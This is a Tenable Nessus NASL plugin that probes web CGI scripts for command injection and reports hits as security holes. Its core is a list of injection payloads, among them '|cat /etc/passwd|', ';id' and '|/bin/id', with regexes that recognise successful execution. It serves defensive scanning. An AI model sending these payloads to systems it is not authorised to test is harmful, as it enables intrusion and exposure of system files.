#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(39465);
 script_version ("$Revision: 1.5 $");

 script_name(english: "CGI Generic Command Execution Vulnerability");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote server." );
 script_set_attribute(attribute:"description", value:
"The remote web server hosts CGI scripts that fail to adequately sanitize 
request strings.  By leveraging this issue,  an attacker may be able 
to execute arbitrary commands on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://en.wikipedia.org/wiki/Code_injection" );
 script_set_attribute(attribute:"solution", value:
"Restrict access to the vulnerable application. Contact the 
vendor for a patch or upgrade." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 script_summary(english: "Tortures the arguments of the remote CGIs (command execution)");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl", "webmirror.nasl", "web_app_test_settings.nasl");
 script_require_ports("Services/www", 80);
 script_timeout(432000);	# Timeout is managed by the script itself
 script_require_keys("Settings/enable_web_app_tests");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("torture_cgi.inc");


####

i = 0; 
flaws_and_patterns = make_array(
"%0Acat%20/etc/passwd",		"RE:root:.*:0:[01]:",
"|cat%20/etc/passwd|",		"RE:root:.*:0:[01]:",
"x%0Acat%20/etc/passwd",	"RE:root:.*:0:[01]:",

";id",				"RE:uid=[0-9].*gid=[0-9]",
"%3Bid",			"RE:uid=[0-9].*gid=[0-9]",
"|id",				"RE:uid=[0-9].*gid=[0-9]",
"%7Bid",			"RE:uid=[0-9].*gid=[0-9]",
"|/bin/id",			"RE:uid=[0-9].*gid=[0-9]",
"|/usr/bin/id",			"RE:uid=[0-9].*gid=[0-9]",
"|id|",				"RE:uid=[0-9].*gid=[0-9]",
# TBD: All the next attacks were prefixed with VALUE
"VALUE;/bin/id",		"RE:uid=[0-9].*gid=[0-9]",
"VALUE;/usr/bin/id",		"RE:uid=[0-9].*gid=[0-9]",
"VALUE%0Acat%20/etc/passwd",	"RE:root:.*:0:[01]:",
"VALUE%20|%20dir",		"ST:<DIR>"
);

if (thorough_tests)
{
 foreach k (make_list("&id", "%26id","VALUE&id"))
   flaws_and_patterns[k] = "RE:uid=[0-9].*gid=[0-9]";
}


init_torture_cgi();

port = get_http_port(default:80, embedded: embedded);

report = torture_cgis(port: port, vul: "EX");

if (strlen(report) > 0)
{
  security_hole(port:port, extra: report);
  if (COMMAND_LINE) display(report, '\n');
}
